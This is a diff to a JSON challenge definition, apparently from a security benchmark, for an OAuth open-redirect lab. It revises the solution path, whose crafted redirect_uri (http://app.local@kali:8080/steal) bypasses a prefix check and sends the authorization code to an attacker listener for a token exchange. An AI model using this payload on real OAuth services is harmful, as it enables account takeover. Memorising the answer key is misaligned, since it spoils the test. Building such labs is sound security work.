@@ -1,7 +1,7 @@
 {
   "id": "api-oauth-redirect",
   "name": "OAuth Open Redirect: Authorization Code Theft via Redirect URI Bypass",
-  "category": "api",
+  "category": "web",
   "difficulty": "medium",
   "owasp": "API2:2023-Broken Authentication",
   "mitre": ["T1557", "T1078"],
@@ -40,10 +40,10 @@
     "vulnerabilityType": ["OAuth Open Redirect", "Authorization Code Theft", "Redirect URI Bypass"],
     "owaspCategory": ["API2:2023-Broken Authentication"],
     "expectedTechniques": ["T1557", "T1078"],
-    "optimalPath": "1. GET /api/docs to understand the OAuth flow. 2. Start an HTTP listener on kali:8080. 3. Request /oauth/authorize with redirect_uri=http://app.local/callback@kali:8080/steal so the auth code is delivered to the listener while still passing the prefix check. 4. POST /oauth/token with the captured code and client credentials. 5. GET /api/profile with the access token — flag returned.",
+    "optimalPath": "1. GET /api/docs to understand the OAuth flow. 2. Start an HTTP listener on kali:8080. 3. Request /oauth/authorize with redirect_uri=http://app.local@kali:8080/steal so the auth code is delivered to the listener while still passing the prefix check. 4. POST /oauth/token with the captured code and client credentials. 5. GET /api/profile with the access token — flag returned.",
     "alternativePaths": [
       "Capture the code from a netcat or socat listener on kali instead of a Python HTTP server",
-      "Use redirect_uri=http://app.local/callback@kali/steal when kali resolves without an explicit port",
+      "Use redirect_uri=http://app.local@kali/steal when kali resolves without an explicit port",
       "Read the captured code from kali's listener logs, then exchange it via /oauth/token"
     ],
     "antiPatterns": [
